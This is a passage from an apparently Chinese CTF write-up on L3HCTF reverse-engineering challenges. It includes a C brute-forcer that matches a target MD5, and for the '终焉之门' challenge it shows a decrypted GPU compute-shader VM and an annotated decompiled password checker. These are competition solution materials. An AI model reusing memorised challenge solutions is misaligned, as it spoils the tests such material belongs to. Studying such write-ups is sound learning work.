&gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>;<br>&#125;<br><br><span class="hljs-comment">// 加密主函数，生成cipher</span><br><span class="hljs-function">uint16_t <span class="hljs-title">encrypt_token</span>(<span class="hljs-params">uint32_t timestamp, uint32_t round_key</span>)</span> &#123;<br>    uint32_t state = timestamp;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> round = <span class="hljs-number">1</span>; round &lt;= <span class="hljs-number">3</span>; round++) &#123;<br>        uint16_t rk = generate_round_key(round_key, round);<br>        state ^= rk;<br>        state = perform_round(state);<br>    &#125;<br><br>    uint16_t rk4 = generate_round_key(round_key, <span class="hljs-number">4</span>);<br>    state ^= rk4;<br>    state = apply_sbox(state);<br><br>    uint16_t rk5 = generate_round_key(round_key, <span class="hljs-number">5</span>);<br>    uint16_t final_state = (uint16_t)(state ^ rk5);<br>    <span class="hljs-keyword">return</span> final_state;<br>&#125;<br><br><span class="hljs-comment">// 计算字符串的MD5并转hex</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">compute_md5_hex</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span>* input, <span class="hljs-built_in">char</span> output[<span class="hljs-number">33</span>]</span>)</span> &#123;<br>    unsigned <span class="hljs-built_in">char</span> digest[MD5_DIGEST_LENGTH];<br>    MD5((<span class="hljs-keyword">const</span> unsigned <span class="hljs-built_in">char</span>*)input, strlen(input), digest);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; MD5_DIGEST_LENGTH; i++) &#123;<br>        sprintf(output + i * <span class="hljs-number">2</span>, <span class="hljs-string">&quot;%02x&quot;</span>, digest[i]);<br>    &#125;<br>    output[<span class="hljs-number">32</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 计算字符串的SHA1并转hex</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">compute_sha1_hex</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span>* input, <span class="hljs-built_in">char</span> output[<span class="hljs-number">41</span>]</span>)</span> &#123;<br>    unsigned <span class="hljs-built_in">char</span> digest[SHA_DIGEST_LENGTH];<br>    SHA1((<span class="hljs-keyword">const</span> unsigned <span class="hljs-built_in">char</span>*)input, strlen(input), digest);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; SHA_DIGEST_LENGTH; i++) &#123;<br>        sprintf(output + i * <span class="hljs-number">2</span>, <span class="hljs-string">&quot;%02x&quot;</span>, digest[i]);<br>    &#125;<br>    output[<span class="hljs-number">40</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    <span class="hljs-built_in">char</span> query[<span class="hljs-number">512</span>];<br>    <span class="hljs-built_in">char</span> md5_str[<span class="hljs-number">33</span>];<br>    <span class="hljs-built_in">char</span> sha1_str[<span class="hljs-number">41</span>];<br><br>    <span class="hljs-keyword">for</span> (uint32_t t = <span class="hljs-number">1751990400</span>; t &lt;= <span class="hljs-number">1752052051</span>; t++) &#123;<br>        uint32_t state = t;<br>        uint32_t output;<br>        prng_generate(&amp;state, &amp;output);<br>        uint32_t cnt = output;<br><br>        uint32_t a = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>;<br>        uint32_t i = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &lt; cnt) &#123;<br>            prng_generate(&amp;state, &amp;a);<br>            prng_generate(&amp;state, &amp;b);<br>            prng_generate(&amp;state, &amp;x);<br>            prng_generate(&amp;state, &amp;y);<br>            prng_generate(&amp;state, &amp;cnt);<br>            i++;<br>        &#125;<br><br>        prng_generate(&amp;state, &amp;output);<br>        uint32_t r = output;<br><br>        int32_t sa = to_signed32(a);<br>        int32_t sb = to_signed32(b);<br>        int32_t sx = to_signed32(x);<br>        int32_t sy = to_signed32(y);<br><br>        <span class="hljs-built_in">double</span> val1 = pow((<span class="hljs-built_in">double</span>)(sa | sx), <span class="hljs-number">2.0</span>);<br>        <span class="hljs-built_in">double</span> val2 = pow((<span class="hljs-built_in">double</span>)(sb | sy), <span class="hljs-number">2.0</span>);<br><br>        <span class="hljs-keyword">if</span> (fabs(<span class="hljs-number">0x61</span> * val1 - <span class="hljs-number">0xb</span> * val2) &lt; <span class="hljs-number">1e-9</span>) &#123;<br>            uint16_t cipher = encrypt_token(t, r);<br>            snprintf(query, <span class="hljs-keyword">sizeof</span>(query), <span class="hljs-string">&quot;salt=%s&amp;t=%u&amp;r=%u&amp;cipher=%u&quot;</span>,<br>                    SALT, t, r, cipher);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            snprintf(query, <span class="hljs-keyword">sizeof</span>(query), <span class="hljs-string">&quot;salt=%s&amp;t=%u&amp;r=%u&amp;a=%u&amp;b=%u&amp;x=%u&amp;y=%u&quot;</span>,<br>                    SALT, t, r, a, b, x, y);<br>        &#125;<br><br>        compute_md5_hex(query, md5_str);<br>        <span class="hljs-keyword">if</span> (strcmp(md5_str, TARGET_MD5) == <span class="hljs-number">0</span>) &#123;<br>            compute_sha1_hex(query, sha1_str);<br>            printf(<span class="hljs-string">&quot;[+] Found!\nQuery: %s\nMD5: %s\nSHA1: %s\n&quot;</span>,<br>                query, md5_str, sha1_str);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930921.png" alt="image-20250716233822571"></p><h1 id="终焉之门"><a href="#终焉之门" class="headerlink" title="终焉之门"></a>终焉之门</h1><p>直接看看不到什么有用的代码，就直接动调，随便翻翻就看到了这个多层base64，解密一下hhhhh</p><p>后来知道这一段是用来循环异或加密得到主要逻辑的</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930627.png" alt="image-20250717165521134"></p><p>aVersion430Core动调的时候双击进去看看，主加密内容放在了.data段</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930246.png" alt="image-20250718000630226"></p><p>这段代码实现了一个运行在 GPU 上的简单虚拟机，通过执行<code>opcodes</code>中的指令序列，对栈数据进行运算</p><p>这里是核心校验</p><p>栈中的前 16 个数，必须等于 <code>cipher[i] - 20</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930578.png" alt="image-20250718215943468"></p><hr><p>还可以通过另一个方法得到主要的逻辑</p><p>我先搜索字符串，找到那么一串base64编码，然后交叉引用找到函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930465.png" alt="image-20250719213918550"></p><p>这个加密函数调用aVersion430Core的内容与base64编码进行循环异或</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930198.png" alt="image-20250719214002648"></p><p>写出代码可以直接跑出内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-comment">#version 430 core</span><br><br>layout(local_size_x = <span class="hljs-number">1</span>, local_size_y = <span class="hljs-number">1</span>, local_size_z = <span class="hljs-number">1</span>) <span class="hljs-keyword">in</span>;<br>layout(std430, binding = <span class="hljs-number">0</span>) buffer OpCodes  &#123; <span class="hljs-built_in">int</span> opcodes[]; &#125;;<br>layout(std430, binding = <span class="hljs-number">2</span>) buffer CoConsts &#123; <span class="hljs-built_in">int</span> co_consts[]; &#125;;<br>layout(std430, binding = <span class="hljs-number">3</span>) buffer Cipher   &#123; <span class="hljs-built_in">int</span> cipher[<span class="hljs-number">16</span>]; &#125;;<br>layout(std430, binding = <span class="hljs-number">4</span>) buffer Stack    &#123; <span class="hljs-built_in">int</span> stack_data[<span class="hljs-number">256</span>]; &#125;;<br>layout(std430, binding = <span class="hljs-number">5</span>) buffer Out      &#123; <span class="hljs-built_in">int</span> verdict;         &#125;;<br><br>const <span class="hljs-built_in">int</span> MaxInstructionCount = <span class="hljs-number">1000</span>;<br><br>void main()<br>&#123;<br>    <span class="hljs-keyword">if</span> (gl_GlobalInvocationID.x &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br><br>    uint ip = 0u;<br>    <span class="hljs-built_in">int</span> sp = <span class="hljs-number">0</span>;<br>    verdict = -<span class="hljs-number">233</span>;<br><br>    <span class="hljs-keyword">while</span> (ip &lt; uint(MaxInstructionCount))<br>    &#123;<br>        <span class="hljs-built_in">int</span> opcode = opcodes[<span class="hljs-built_in">int</span>(ip)];<br>        <span class="hljs-built_in">int</span> arg    = opcodes[<span class="hljs-built_in">int</span>(ip)+<span class="hljs-number">1</span>];<br><br>        switch (opcode)<br>        &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                stack_data[sp++] = co_consts[arg];<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                stack_data[sp++] = a + b;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                stack_data[sp++] = a - b;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                stack_data[sp++] = a ^ b;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> b = stack_data[--sp];<br>                <span class="hljs-built_in">int</span> a = stack_data[--sp];<br>                stack_data[sp++] = <span class="hljs-built_in">int</span>(a == b);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            &#123;<br>                <span class="hljs-built_in">bool</span> ok = true;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (stack_data[i] != (cipher[i] - <span class="hljs-number">20</span>))<br>                    &#123; <br>                        ok = false; <br>                        <span class="hljs-keyword">break</span>; <br>                    &#125;<br>                &#125;<br>                verdict = ok ? <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-number">18</span>:<br>            &#123;<br>                <span class="hljs-built_in">int</span> c = stack_data[--sp];<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) ip = uint(arg);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            default:<br>                verdict = <span class="hljs-number">500</span>;<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        ip+=<span class="hljs-number">2</span>;<br>    &#125;<br>    verdict = <span class="hljs-number">501</span>;<br>&#125;<br>l <br><br>进程已结束，退出代码为 <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><hr><p>从这三个地址里得到opcodes，co_consts和cipher的内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507182250461.png" alt="image-20250718225015357"></p><p>这里贴出主函数的内容以及注释部分</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c#">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_7FF656701CF0</span>(<span class="hljs-params"><span class="hljs-built_in">double</span> a1</span>)</span><br>&#123;<br>  <span class="hljs-built_in">int</span> v1; <span class="hljs-comment">// ebx</span><br>  __m128i v2; <span class="hljs-comment">// xmm6</span><br>  unsigned <span class="hljs-built_in">int</span> v3; <span class="hljs-comment">// eax</span><br>  unsigned <span class="hljs-built_in">int</span> v4; <span class="hljs-comment">// r13d</span><br>  unsigned <span class="hljs-built_in">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-built_in">int</span> v6; <span class="hljs-comment">// eax</span><br>  __int64 v7; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-built_in">bool</span> v8; <span class="hljs-comment">// dl</span><br>  <span class="hljs-built_in">bool</span> v9; <span class="hljs-comment">// al</span><br>  <span class="hljs-built_in">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-built_in">char</span> *v12; <span class="hljs-comment">// r15</span><br>  unsigned <span class="hljs-built_in">int</span> v13; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-built_in">int</span> v14; <span class="hljs-comment">// eax</span><br>  unsigned <span class="hljs-built_in">int</span> v15; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-built_in">int</span> v16; <span class="hljs-comment">// edx</span><br>  <span class="hljs-built_in">int</span> v17; <span class="hljs-comment">// eax</span><br>  <span class="hljs-built_in">int</span> v18; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-built_in">int</span> v19; <span class="hljs-comment">// eax</span><br>  unsigned <span class="hljs-built_in">int</span> v20; <span class="hljs-comment">// [rsp+38h] [rbp-100h]</span><br>  unsigned <span class="hljs-built_in">int</span> v21; <span class="hljs-comment">// [rsp+3Ch] [rbp-FCh]</span><br>  unsigned <span class="hljs-built_in">int</span> v22; <span class="hljs-comment">// [rsp+40h] [rbp-F8h]</span><br>  unsigned <span class="hljs-built_in">int</span> v23; <span class="hljs-comment">// [rsp+44h] [rbp-F4h]</span><br>  unsigned <span class="hljs-built_in">int</span> v24; <span class="hljs-comment">// [rsp+48h] [rbp-F0h]</span><br>  <span class="hljs-built_in">int</span> v25; <span class="hljs-comment">// [rsp+4Ch] [rbp-ECh]</span><br>  __m128i v26; <span class="hljs-comment">// [rsp+50h] [rbp-E8h] BYREF</span><br>  <span class="hljs-built_in">int</span> v27; <span class="hljs-comment">// [rsp+6Ch] [rbp-CCh] BYREF</span><br>  <span class="hljs-built_in">char</span> Str[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-C8h] BYREF</span><br>  __int64 v29; <span class="hljs-comment">// [rsp+78h] [rbp-C0h]</span><br>  __int64 v30; <span class="hljs-comment">// [rsp+80h] [rbp-B8h]</span><br>  __int64 v31; <span class="hljs-comment">// [rsp+88h] [rbp-B0h]</span><br>  __int64 v32[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+90h] [rbp-A8h] BYREF</span><br>  __int64 v33[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+C8h] [rbp-70h]</span><br><br>  v1 = <span class="hljs-number">0</span>;<br>  sub_7FF6566FE370();<br>  sub_7FF656693480(<span class="hljs-number">8256</span>);<br>  sub_7FF65668F730(<span class="hljs-number">0x500</span>u, <span class="hljs-number">0x320</span>u, <span class="hljs-string">&quot;Password Checker&quot;</span>);<span class="hljs-comment">// 创建窗口</span><br>  sub_7FF656691100(&amp;v26, <span class="hljs-number">0</span>i64, aVersion330Defi);<br>  v2 = _mm_loadu_si128(&amp;v26);<br>  v3 = sub_7FF65667E700(aVersion430Core, <span class="hljs-number">37305</span>i64);<span class="hljs-comment">// 创建计算着色器</span><br>  v20 = sub_7FF65667EEE0(v3);                   <span class="hljs-comment">// 创建着色器程序</span><br>  v21 = sub_7FF65667EFF0(<span class="hljs-number">0x2A0</span>u, &amp;unk_7FF6567030E0, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// opcodes</span><br>  v4 = sub_7FF65667EFF0(<span class="hljs-number">0x80</span>u, &amp;dword_7FF656703060, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// co_consts</span><br>  v22 = sub_7FF65667EFF0(<span class="hljs-number">0x40</span>u, &amp;unk_7FF656703020, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// cipher</span><br>  v23 = sub_7FF65667EFF0(<span class="hljs-number">0x400</span>u, &amp;unk_7FF65675F040, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// stack</span><br>  v5 = sub_7FF65667EFF0(<span class="hljs-number">4u</span>, &amp;dword_7FF656703000, <span class="hljs-number">0x88EA</span>u);<span class="hljs-comment">// verdict</span><br>  v33[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>i64;<br>  v24 = v5;<br>  *Str = <span class="hljs-number">0</span>i64;<br>  v29 = <span class="hljs-number">0</span>i64;<br>  v30 = <span class="hljs-number">0</span>i64;<br>  v31 = <span class="hljs-number">0</span>i64;<br>  memset(v32, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v32));<br>  *(v33 + <span class="hljs-number">5</span>) = <span class="hljs-number">0</span>i64;<br>  sub_7FF6566931A0(<span class="hljs-number">60</span>);<br>  <span class="hljs-keyword">while</span> ( !sub_7FF65668CAC0() )<br>  &#123;<br>    v6 = sub_7FF656695A40();                    <span class="hljs-comment">// 输入</span><br>    <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">99</span> )<br>    &#123;<br>      v7 = v1 + <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        Str[v7 - <span class="hljs-number">1</span>] = v6;<br>        v1 = v7;<br>        v6 = sub_7FF656695A40();<br>        v8 = v7++ &lt;= <span class="hljs-number">99</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v8 &amp;&amp; v6 &gt; <span class="hljs-number">0</span> );<br>    &#125;<br>    v9 = sub_7FF6566958E0(<span class="hljs-number">259</span>);<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> &amp;&amp; v9 )<br>      Str[--v1] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( sub_7FF6566958E0(<span class="hljs-number">257</span>) &amp;&amp; strlen(Str) == <span class="hljs-number">40</span> &amp;&amp; !strncmp(Str, <span class="hljs-string">&quot;L3HCTF&#123;&quot;</span>, <span class="hljs-number">7u</span>i64) &amp;&amp; HIBYTE(v32[<span class="hljs-number">0</span>]) == <span class="hljs-number">125</span> )<br>    &#123;                                           <span class="hljs-comment">// 提取花括号内的32个字符</span><br>      v25 = v1;<br>      v12 = &amp;Str[<span class="hljs-number">7</span>];<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span>                                        <span class="hljs-comment">// 将十六进制字符串转换为数值</span><br>      &#123;<br>        v17 = *v12;<br>        v18 = v12[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ( v17 &gt; <span class="hljs-number">96</span> )<br>          v14 = v17 - <span class="hljs-number">87</span>;                       <span class="hljs-comment">// 字符转数字 (0-9, a-f, A-F)</span><br>        <span class="hljs-keyword">else</span><br>          v14 = v17 - <span class="hljs-number">48</span>;<br>        v19 = <span class="hljs-number">16</span> * v14;<br>        v15 = v13;<br>        v16 = v18 - <span class="hljs-number">48</span>;<br>        <span class="hljs-keyword">if</span> ( v18 &gt;= <span class="hljs-number">97</span> )<br>          v16 = v18 - <span class="hljs-number">87</span>;<br>        v12 += <span class="hljs-number">2</span>;<br>        v13 += <span class="hljs-number">4</span>;<br>        v27 = v16 + v19;                        <span class="hljs-comment">// 组合成一个字节</span><br>                                                <span class="hljs-comment">// 32 个字符被转换为 16 个整数，每个整数由 2 个十六进制字符组成</span><br>        sub_7FF65667F0B0(v4, &amp;v27, <span class="hljs-number">4u</span>, v15);    <span class="hljs-comment">// 将转换后的字节写入co_consts缓冲区</span><br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v32 + <span class="hljs-number">7</span> != v12 );<br>      v1 = v25;<br>      sub_7FF65667C100(v20);                    <span class="hljs-comment">// 执行计算着色器</span><br>      sub_7FF65667F180(v21, <span class="hljs-number">0</span>i64);              <span class="hljs-comment">// opcodes</span><br>      sub_7FF65667F180(v4, <span class="hljs-number">2</span>i64);               <span class="hljs-comment">// co_consts </span><br>      sub_7FF65667F180(v22, <span class="hljs-number">3</span>i64);              <span class="hljs-comment">// cipher</span><br>      sub_7FF65667F180(v23, <span class="hljs-number">4</span>i64);<br>      sub_7FF65667F180(v24, <span class="hljs-number">5</span>i64);<br>      sub_7FF65667EFE0(<span class="hljs-number">1</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">1</span>i64);       <span class="hljs-comment">// 执行着色器</span><br>      sub_7FF65667F140(v24, &amp;dword_7FF656703000, <span class="hljs-number">4</span>i64, <span class="hljs-number">0</span>i64);<br>      sub_7FF65667C110();<br>    &#125;<br>    sub_7FF65668FC90(a1);<br>    v26 = v2;<br>    sub_7FF656690650(&amp;v26);<br>    a1 = sub_7FF65668E170();<br>    v26 = v2;<br>    *&amp;a1 = a1;<br>    v27 = LODWORD(a1);<br>    v10 = sub_7FF656691440(&amp;v26);<br>    v26 = v2;<br>    sub_7FF656691460(v26.m128i_i64, v10, &amp;v27, <span class="hljs-number">0</span>);<br>    sub_7FF6566AB9D0(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1280</span>i64, <span class="hljs-number">0x320</span>u, <span class="hljs-number">0xFFFFFFFF</span>);<br>    sub_7FF656690690();<br>    sub_7FF6566BDA20(Str, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0xC8</span>u, <span class="hljs-number">40</span>, <span class="hljs-number">-16777216</span>);<br>    <span class="hljs-keyword">if</span> ( dword_7FF656703000 == <span class="hljs-number">1</span> )<br>      sub_7FF6566BDA20(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x12C</span>u, <span class="hljs-number">40</span>, <span class="hljs-number">-13863680</span>);<br>    <span class="hljs-keyword">else</span><br>      sub_7FF6566BDA20(<span class="hljs-string">&quot;wrong password&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x12C</span>u, <span class="hljs-number">40</span>, <span class="hljs-number">-13162010</span>);<br>    sub_7FF6566BDA20(<span class="hljs-string">&quot;Type password and press [Enter] to check!&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x64</span>u, <span class="hljs-number">20</span>, <span class="hljs-number">-8224126</span>);<br>    sub_7FF6566BDA20(<span class="hljs-string">&quot;Press [Backspace] to delete characters.&quot;</span>, <span class="hljs-number">0x64</span>u, <span class="hljs-number">0x82</span>u, <span class="hljs-number">20</span>, <span class="hljs-number">-8224126</span>);<br>    sub_7FF656695CE0();<br>  &#125;<br>  sub_7FF65668FAA0();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到关键信息之后，写一个解释器，看看虚拟机解释器是如何操作栈中的数据，得到加密逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 